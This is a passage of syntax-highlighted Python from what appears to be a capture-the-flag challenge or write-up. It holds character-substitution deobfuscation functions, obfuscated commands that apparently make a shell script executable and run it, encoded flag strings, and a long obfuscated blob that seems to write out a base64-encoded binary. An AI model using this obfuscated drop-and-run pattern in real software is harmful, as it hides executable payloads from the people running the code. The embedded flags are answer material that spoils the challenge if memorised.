+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;U&#39;</span>: <span style=color:#e6db74>&#39;H&#39;</span>, <span style=color:#e6db74>&#39;V&#39;</span>: <span style=color:#e6db74>&#39;I&#39;</span>, <span style=color:#e6db74>&#39;W&#39;</span>: <span style=color:#e6db74>&#39;J&#39;</span>, <span style=color:#e6db74>&#39;X&#39;</span>: <span style=color:#e6db74>&#39;K&#39;</span>, <span style=color:#e6db74>&#39;Y&#39;</span>: <span style=color:#e6db74>&#39;L&#39;</span>, <span style=color:#e6db74>&#39;Z&#39;</span>: <span style=color:#e6db74>&#39;M&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;0&#39;</span>: <span style=color:#e6db74>&#39;5&#39;</span>, <span style=color:#e6db74>&#39;1&#39;</span>: <span style=color:#e6db74>&#39;6&#39;</span>, <span style=color:#e6db74>&#39;2&#39;</span>: <span style=color:#e6db74>&#39;7&#39;</span>, <span style=color:#e6db74>&#39;3&#39;</span>: <span style=color:#e6db74>&#39;8&#39;</span>, <span style=color:#e6db74>&#39;4&#39;</span>: <span style=color:#e6db74>&#39;9&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;5&#39;</span>: <span style=color:#e6db74>&#39;0&#39;</span>, <span style=color:#e6db74>&#39;6&#39;</span>: <span style=color:#e6db74>&#39;1&#39;</span>, <span style=color:#e6db74>&#39;7&#39;</span>: <span style=color:#e6db74>&#39;2&#39;</span>, <span style=color:#e6db74>&#39;8&#39;</span>: <span style=color:#e6db74>&#39;3&#39;</span>, <span style=color:#e6db74>&#39;9&#39;</span>: <span style=color:#e6db74>&#39;4&#39;</span>,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;_&#39;</span>: <span style=color:#e6db74>&#39;-&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>: <span style=color:#e6db74>&#39;_&#39;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(mapping<span style=color:#f92672>.</span>get(c, c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deobfuscate2</span>(string):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse_alpha</span>(c):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;a&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;Z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;Z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> c
+</span></span><span style=display:flex><span>    digit_map <span style=color:#f92672>=</span> {str(i): str(<span style=color:#ae81ff>9</span> <span style=color:#f92672>-</span> i) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>)}
+</span></span><span style=display:flex><span>    symbol_map <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;_&#39;</span>: <span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#e6db74>&#39;=&#39;</span>: <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>: <span style=color:#e6db74>&#39;+&#39;</span>, <span style=color:#e6db74>&#39;+&#39;</span>: <span style=color:#e6db74>&#39;-&#39;</span>}
+</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> c<span style=color:#f92672>.</span>isalpha():
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(reverse_alpha(c))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>in</span> digit_map:
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(digit_map[c])
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>in</span> symbol_map:
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(symbol_map[c])
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(c)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(result)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deobfuscate3</span>(string):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse_char</span>(c):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;a&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;Z&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> chr(ord(<span style=color:#e6db74>&#39;Z&#39;</span>) <span style=color:#f92672>-</span> (ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>)))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>&lt;=</span> <span style=color:#e6db74>&#39;9&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> str(<span style=color:#ae81ff>9</span> <span style=color:#f92672>-</span> int(c))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;_&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;*&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;*&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;_&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;-&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;!&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;!&#39;</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;-&#39;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> c
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(reverse_char(c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>command1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;puzbq _k yby.fu&#34;</span>
+</span></span><span style=display:flex><span>command2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./yby.fu #FX!PREG{5osh0p9265a*9aq*0y88c}&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>#+/ova/onfu
+</span></span></span><span style=display:flex><span><span style=color:#e6db74># FX!PREG{6*j6yy*y89i8*l5h*05z82u6a1*u8e8}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>rpub !a &#39;s5IZEtVONDNNNNNNNNNNNNZNCtNONNNNNORNNNNNNNONNNNNNNNNNVN8NNNNNNNNNNNNNRNNBNNB
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NRNNVNNsNNLNNNNRNNNNDNNNNNNNNNONNNNNNNNNNRNNNNNNNNNNRNZNNNNNNNNDNjNNNNNNNNtN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNjNNNNDNNNPxNjNNNNNNNXDQNNNNNNNNcNZNNNNNNNNpNNNNNNNNNOjNNNNNNNNNNDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNONNNNONNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWtUNNNNNNNNzNpNNNNNNNNNRNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNRNNNNSNNNNNONNNNNNNNNNRNNNNNNNNNNDNNNNNNNNjDZNNNNNNNQONjNNNNNNNNNDNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNDNNNNDNNNNNVNNNNNNNNNNtNNNNNNNNNPNNNNNNNNQpNDNNNNNNNAjONNNNNNNNNONNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNONNNNOtNNNWNgNNNNNNNNxQ5NNNNNNNPDCDNNNNNNNVNPNNNNNNNNvNVNNNNNNNNNRNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNVNNNNTNNNNbP5NNNNNNNPtCDNNNNNNNXN4NNNNNNNN3NRNNNNNNNQjNDNNNNNNNNtNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ONNNNNDNNNODNjNNNNNNNSNQNNNNNNNNHNZNNNNNNNNjNNNNNNNNNQNNNNNNNNNNPNNNNNNNNNNR
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNONNNNVNQNNNNNNNNtNZNNNNNNNPNNjNNNNNNNPDNNNNNNNNNWNNNNNNNNNNRNNNNNNNNNNDN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNRNNNNGPRNNNNNNNOZVDNNNNNNNRjuNNNNNNNNxNNNNNNNNNPDNNNNNNNNNNDNNNNNNNNNH_I5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>MNDNNNODNjNNNNNNNSNQNNNNNNNNHNZNNNNNNNNjNNNNNNNNNQNNNNNNNNNNPNNNNNNNNNOD0KEx
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ONNNNTjtNNNNNNNNoPNNNNNNNNOfVNNNNNNNNQDNNNNNNNNNANNNNNNNNNNRNNNNNNNNNSUyqTDT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNHhI5MNDN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNPDYDNNNNNNNWN4NNNNNNNNxQ5NNNNNNNOjNtNNNNNNNUNPNNNNNNNNNDNNNNNNNNNRNNNNVNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNHNNNOUGyHNNtNNjNDNNNNQNNNNNNNNNNXNNZNRNNNNNDNNNNNNNNNRNNNNSNNNNNZNNNOUGyHN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>x7bQPSYuoyi242Q6DN2PB_yI1dfioTyvAwDioTDgoTyhqKtgrQt7YGL5YaAiYwVNNtNNNNfNNNNO
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNOtNNNNNNtDNNNNNNPjNNNNNNNNQEMp0gNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNO5N
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNFNNNNNNNNNNNNNNNNNNNNNNNNNWNNNNNtNNNNNNNNNNNNNNNNNNNNNNNNNNpNNNNFNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNjNNNNFNNNNNNNNNNNNNNNNNNNNNNNNNQ9NNNNFNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNSDNNNNFNNNNNNNNNNNNNNNNNNNNNNNNNXjNNNNtNNNNNNNNNNNNNNNNNNNNNNNNNRHNNNNF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNYfNNNNtNNNNNNNNNNNNNNNNNNNNNNNNNNRNNNNFNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNP3NNNNvNNNNNNNNNNNNNNNNNNNNNNNNNNOmoTIypNOjqKEmNS4sp8EuL7gsL7ue
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>K7MunJjNK64fnJWwK8A5LKW5K76unJ9NK64wrTSsMzyhLJkcrzHNpUWcoaEzNS4snKAiLmx0K8Aw
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LJ0zNUA5pzAgpNOfnJWwYaAiYwLNE5kWDxAsZv98NRqZFHWQKmVhANOUGRyPD63lYwVhADOUGRyP
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>D63lYwZ5NS4WIR6sMTIlMJqcp8EypyEAD7kiozIHLJWfMDOsK7qgo70sp8EupaEsKjOsFIEAK8Wy
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>M7ymqTIlIR6QoT4hMIEuLzkyNNNNNNVNNDNQNNDNNjNQNNRNODNONNZNNjNNNNRNONOoNNNNRNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNKnJxANNNSNTHNNNNDNNNNSTycQDNNONOiNNNNRNNNNUHnnDxNNNZNrDNNNONNNNP5xMLT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNPNVHNNNNNNNNNxQ5NNNNNNNNVNNNNNNNNNBNENNNNNNNNzQ5NNNNNNNNVNNNNNNNNNXNENNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNPRNNNNNNNNNVNNNNNNNNNNuNNNNNNNNN7Q3NNNNNNNNTNNNNNDNNNNNNNNNNNNNN9Q3NNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNTNNNNNtNNNNNNNNNNNNNN1Q3NNNNNNNNTNNNNOjNNNNNNNNNNNNNN3Q3NNNNNNNNTNNNNPDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNN_Q3NNNNNNNNTNNNNPjNNNNNNNNNNNNNNdQ3NNNNNNNNUNNNNNjNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>fQ3NNNNNNNNUNNNNONNNNNNNNNNNNNNNhQ3NNNNNNNNUNNNNODNNNNNNNNNNNNNNjQ3NNNNNNNNU
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNOtNNNNNNNNNNNNNNlQ3NNNNNNNNUNNNNPNNNNNNNNNNNNNNN5Q3NNNNNNNNUNNNNPtNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNCZCUicVt_jV
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>FVfS7F3NNRvSjUDP/4OVt3DVjjNNNNNN/mIlYjNN/lI5YjNNQk4NNCZCUicbNNNNNBav////McQm
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Qk21nNRNNNQc5i///7nD3j3r_ztPNNNN1pY///4zxCZCUicbNjNNNBzl////McQmQk21nNDNNNQc
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>bi///7nD3j3r_ztSNNNN1MY///4zxCZCUie/WI9iNNOzQk4RNNQmQk21/lK_YtNNMt3sENNN3j3r
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>_i3y4v9NNTLCU5DNNCZCUie/Wr9hNNOzQk4RNNQmQk21/lKzYtNNMt3sENNN3j3r_i3y8v9NNTLC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>U5DNNCZCUie/WqLhNNOzQk4RNNQmQk21Zr6WvqSrFVavFVCx3SOHEGUNZpyVwG8XNNNN/kJmYtNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>4TLhQk_RNNNNNNOVwG8MYtNNFV5S5v9NNRt0_UDIFVfSyv9NNRvSjUDW/_NCU9NNNNNNjj3stNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNOVwG7cYtNNFV56bv9NNRtc/xvW3RwO2w4VjstQFNUTFAU_qOEVvjIyYtNNFVKNqNw/9TLCU5DN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NZZCU9NNNNNN3j3r_bN4MF9NNNO6X6IVtm6PYtNNNRvW0KDZFVf4Ev9NNBwW/i//1TG////TOG5h
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNOKpZCUjQQQk_NNNNNNCZCUiecq/////ZCUicIFVayFVCfpTEVvjDyXNNNNRvWEstkjZMS5SCT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EqSYkxKFYpMS55CTEqESkxKIHfMS6yGTEqq2kxKLnZMS7GGTEqclkxKoMZMS8TCTEq5jkxKrMZMS
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>8mCTErOxkxKuK3MS9aQTErAfkxKxAZMS0GUTErMhkxKaA3MS1QCTEry9kxKdA3MS188TErjNFV5S
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>uD5NNRvWk2tNNNNN1QG_//4VwHJjFVaTFV5SqD5NNRvWk2tNNNNN1Qa_//4VhUAyL8WyqNNNhtNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNOVvHJDFVyIzToUEnNNNRvAIMOVwHJjFVaJFVaU1Ca4//_SjN_ShNNNNRvAOFjANNOVvpsbfi8/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>/23ONNNN1Cw4//4VwDHzQDNNFVaUhNNNNNQbgC8//23ONNNN1Ae4//4VwDHJQDNNFVaUhNNNNNQb
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>yi8//23ONNNN1Ym4//4VwDHTQDNNFVaUhNNNNNQbrC8//23ONNNN1W24//4VwDK7QNNNFVaUhNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNQbJi8//23ONNNN1VQ4//4VwDKzQNNNFVaUhNNNNNQbCC8//5vAEqOVvpsbRC8//2tNNNNN1jJ9
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NDNNNRvYIsuxFPfHWFtNNNO5OrtN/s//lpZNNCZCUicVt_jVFVCRPZZNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
